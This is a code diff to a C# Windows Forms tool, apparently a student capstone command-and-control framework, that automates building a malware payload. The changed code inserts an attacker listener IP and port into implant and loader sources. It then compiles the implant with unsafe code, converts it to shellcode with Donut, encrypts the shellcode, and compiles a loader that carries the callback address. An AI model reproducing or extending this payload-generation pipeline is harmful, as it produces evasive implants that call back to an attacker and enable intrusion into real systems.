@@ -755,26 +755,27 @@ Invoke-Run
 
             try
             {
-                string originalFileContents = ReadFileContents(implantFilePath, "Read original Implant.cs");
-
-                // Replace the placeholder strings with actual values
-                string modifiedFileContents = originalFileContents
+                // Handle Implant.cs
+                string originalImplantContents = ReadFileContents(implantFilePath, "Read original Implant.cs");
+                string modifiedImplantContents = originalImplantContents
                     .Replace("public static string host = \"<IP>\";", $"public static string host = \"{ip}\";")
                     .Replace("public static string port = \"<PORT>\";", $"public static string port = \"{port}\";");
 
-                WriteFileContents(implantFilePath, modifiedFileContents, "Write modified Implant.cs");
+                WriteFileContents(implantFilePath, modifiedImplantContents, "Write modified Implant.cs");
 
-                // Proceed with the compilation and conversion to shellcode
-                //ExecuteCompilationAndConversion(basedirWin, implantFilePath, "Compilation and conversion");
+                // Compilation and conversion process for both Implant and Loader
+                ExecuteCompilationAndConversion(basedirWin, implantFilePath, "Compilation and conversion for Implant");
 
-                // Revert the file changes
-                WriteFileContents(implantFilePath, originalFileContents, "Revert Implant.cs changes");
+                // Revert the changes to maintain original state
+                WriteFileContents(implantFilePath, originalImplantContents, "Revert Implant.cs changes");
             }
             catch (Exception ex)
             {
                 MessageBox.Show($"An error occurred: {ex.Message}");
             }
         }
+
+
 
         private string ReadFileContents(string filePath, string operation)
         {
@@ -811,11 +812,13 @@ Invoke-Run
                 string outputShellcodePath = Path.Combine(basedirWin, "Encryption\\implant.bin");
 
                 // Compile the C# code
-                string compileCommand = $"/c \"{cscPath}\" /unsafe /out:\"{implantExePath}\" \"{implantFilePath}\" \"{modulesPath}\"";
+                string compileCommand = $"/unsafe /out:\"{implantExePath}\" \"{implantFilePath}\" \"{modulesPath}\"";
 
                 // Convert the compiled executable to shellcode using Donut
-                string convertCommand = $"/c \"{donutPath}\" -a 2 --input:\"{implantExePath}\" --output:\"{outputShellcodePath}\"";
-                
+                string convertCommand = $"-a 2 --input:\"{implantExePath}\" --output:\"{outputShellcodePath}\"";
+                /*txtPayloadGen.AppendText($"{compileCommand}\n\n" + Environment.NewLine);
+                txtPayloadGen.AppendText($"{convertCommand}\n\n" + Environment.NewLine);*/
+
                 ExecuteCommand(cscPath, compileCommand);
                 ExecuteCommand(donutPath, convertCommand);
             }
@@ -845,18 +848,18 @@ Invoke-Run
                     string error = process.StandardError.ReadToEnd();
 
                     // Append both standard output and error to the text box
-/*                    txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);*/
+                    //txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);
                     if (!string.IsNullOrEmpty(error))
-                    {
-/*                        txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);*/
+                    { 
+                        /*txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);*/
                     }
 
                     // Append command details for reference
-/*                    txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);*/
+                    /*txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);*/
                 }
                 catch (Exception ex)
                 {
-/*                    txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);*/
+                    /*txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);*/
                 }
             }
         }
@@ -868,19 +871,10 @@ Invoke-Run
             string outputFilePath = Path.Combine(basedirWin, "OutputShellcode\\implant.bin");
 
             string arguments = $"\"{pythonScriptPath}\" -f \"{inputFilePath}\" -o \"{outputFilePath}\"";
+            /*txtPayloadGen.AppendText($"{arguments}" + Environment.NewLine);*/
 
-            // Checking the Operating System
-            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
-            {
-                // For Windows, execute the Python script using python command
-                ExecuteCommand("python", arguments);
-            }
-            else
-            {
-                // For non-Windows systems, you may need to adjust the command
-                // For example, you might directly call 'python' or specify a different path
-                ExecuteCommand("python", arguments);
-            }
+            ExecuteCommand("python", arguments);
+
         }
 
         private void CompileLoader()
@@ -892,8 +886,10 @@ Invoke-Run
                 string loaderCsPath = @"C:\Users\vquer\Documents\Capstone\Implementation\Loader\Loader.cs";
 
                 string arguments = $"/out:\"{loaderExePath}\" \"{loaderCsPath}\"";
+                /*txtPayloadGen.AppendText($"{arguments}" + Environment.NewLine);*/
 
                 ExecuteCommand(cscPath, arguments);
+                SaveCompiledLoader();
             }
             else
             {
@@ -928,6 +924,7 @@ Invoke-Run
 
         private void btnGenerateImplantShellcode_Click(object sender, EventArgs e)
         {
+            string basedirWin = "C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\";
             string selectedName = null;
             string selectedHost = null;
             string selectedPort = null;
@@ -956,21 +953,23 @@ Invoke-Run
                 return;
             }
 
-            var listenerData = new
-            {
-                Name = selectedName,
-                IP = selectedHost,
-                Port = selectedPort,
-                Header = "",
-            };
+            CompileAndConvertToShellcode(basedirWin, selectedHost, selectedPort);
 
-            /*var json = JsonConvert.SerializeObject(listenerData);
-*/
-            CompileAndConvertToShellcode("C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\", selectedHost, selectedPort);
+            EncryptShellcode(basedirWin);
 
-            EncryptShellcode("C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\");
+            string loaderFilePath = Path.Combine(basedirWin, "Loader\\Loader.cs");
+
+            // Handle Loader.cs
+            string originalLoaderContents = ReadFileContents(loaderFilePath, "Read original Loader.cs");
+            string modifiedLoaderContents = originalLoaderContents
+                .Replace("public static string host = \"<IP>\";", $"public static string host = \"{selectedHost}\";")
+                .Replace("public static string port = \"<PORT>\";", $"public static string port = \"{selectedPort}\";");
+
+            WriteFileContents(loaderFilePath, modifiedLoaderContents, "Write modified Loader.cs");
 
             CompileLoader();
+
+            WriteFileContents(loaderFilePath, originalLoaderContents, "Revert Loader.cs changes");
         }
 
 
